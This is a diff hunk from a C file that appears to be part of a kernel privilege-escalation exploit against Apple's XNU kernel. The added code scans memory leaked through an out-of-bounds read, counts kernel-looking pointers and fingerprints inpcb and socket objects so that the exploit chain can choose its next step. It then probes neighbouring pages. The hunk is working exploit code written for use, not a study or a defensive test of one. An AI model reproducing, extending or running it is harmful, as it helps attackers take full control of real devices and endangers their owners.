@@ -230,7 +230,33 @@ kern_return_t cs2_pe_v1(void) {
                 }
                 /* foreign content (not our marker) = target layer proven */
                 if (lkr == KERN_SUCCESS && lq0 != cs2_ctx.random_marker) {
-                    lswProven = true;
+                    lswProven = 1;
+                    /* [lswarm-cls] static-verified fingerprints (23F77 audit
+                       2026-11-15): inpcb record = qword+0x38 AND +0x40 both
+                       kernel-range at a 0x400 boundary; socket object =
+                       qword+0x18 kernel-range AND int32+0x23c in (0,0x10000).
+                       Read-only buffer scan — identifies WHAT the confused
+                       window holds so the next tap knows which rung to take. */
+                    {
+                        uint32_t cls_len = (uint32_t)((cs2_ctx.oob_size < 0x4000) ? cs2_ctx.oob_size : 0x4000);
+                        int kq = 0, ipc_cand = -1, so_cand = -1;
+                        for (uint32_t wq = 0; wq + 8 <= cls_len; wq += 8) {
+                            uint64_t v = *(uint64_t *)((uint8_t *)read_buffer + wq);
+                            if ((v >> 48) >= 0xffff) kq++;
+                        }
+                        for (uint32_t zo = 0; zo + 0x400 <= cls_len; zo += 0x400) {
+                            uint64_t z38 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x38);
+                            uint64_t z40 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x40);
+                            if (ipc_cand < 0 && (z38 >> 48) >= 0xffff && (z40 >> 48) >= 0xffff)
+                                ipc_cand = (int)zo;
+                            uint64_t s18 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x18);
+                            int32_t s23c = *(int32_t *)((uint8_t *)read_buffer + zo + 0x23c);
+                            if (so_cand < 0 && (s18 >> 48) >= 0xffff && s23c > 0 && s23c < 0x10000)
+                                so_cand = (int)zo;
+                        }
+                        LOG("[lswarm-cls] map=%lu off=0x%zx kq=%d inpcb_cand=0x%x sock_cand=0x%x (0x400 stride, static-verified)",
+                            s, lt, kq, (unsigned)ipc_cand, (unsigned)so_cand);
+                    }
                     for (int nb = -3; nb <= 3 && !success; nb++) {
                         if (nb == 0) continue;
                         int64_t nt = (int64_t)lt + (int64_t)nb * (int64_t)vm_page_size;
